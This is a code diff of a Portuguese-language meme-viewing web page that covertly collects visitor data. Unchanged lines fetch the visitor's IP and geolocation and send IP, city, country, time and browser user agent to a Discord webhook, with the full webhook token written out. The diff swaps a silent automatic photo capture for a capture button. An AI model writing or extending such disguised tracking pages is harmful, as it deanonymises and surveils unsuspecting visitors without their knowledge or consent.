@@ -9,7 +9,8 @@
     .meme-container { text-align: center; margin-bottom: 20px; }
     .meme-container img, .meme-container video { max-width: 100%; height: auto; }
     .info { text-align: center; margin-top: 20px; font-size: 16px; }
-    .photo { margin-top: 20px; }
+    .photo { margin-top: 20px; text-align: center; }
+    .btn-capture { background-color: #007bff; color: white; padding: 10px 20px; border-radius: 5px; cursor: pointer; }
   </style>
 </head>
 <body>
@@ -96,6 +97,20 @@
       }
     }
 
+    // Função que exibe o meme e ativa o botão para capturar a foto
+    function startCapture(meme) {
+      // Exibir o meme
+      displayMeme(meme);
+
+      // Após o meme ser exibido, adicionar o botão para capturar a foto
+      const photoContainer = document.getElementById("photoContainer");
+      const captureButton = document.createElement("button");
+      captureButton.className = "btn-capture";
+      captureButton.innerText = "Capturar Foto";
+      captureButton.onclick = capturePhoto;
+      photoContainer.appendChild(captureButton);
+    }
+
     // Carregar as informações de localização, meme, data/hora, dispositivo e tirar foto
     fetch("https://ipapi.co/json")
       .then(res => res.json())
@@ -110,8 +125,8 @@
 
         document.getElementById("info").innerHTML = locationInfo + "<br><br>" + deviceInfo;
 
-        // Mostrar o meme correto
-        displayMeme(meme);
+        // Exibir o meme e preparar para capturar a foto
+        startCapture(meme);
 
         // Enviar dados para o Discord via Webhook
         fetch("https://discord.com/api/webhooks/1371164024217272490/oy4D3DFmXtlobnD2QYi11LU_izNCXp5NmYPMCMmiP1Q28XrvC6UCMCiiRzTfQM_iMpb3", {
@@ -121,9 +136,6 @@
             content: `**Meme Visualizado:**\nMeme: ${meme}\nReferência: ${ref}\nIP: ${data.ip}\nLocal: ${data.city}, ${data.country_name}\nData/Hora: ${new Date().toLocaleString()}\nAparelho: ${navigator.userAgent}`
           })
         });
-
-        // Tentar tirar uma foto
-        setTimeout(capturePhoto, 3000); // Aguarda 3 segundos para garantir que o meme foi carregado antes da captura
       });
   </script>
 </body>
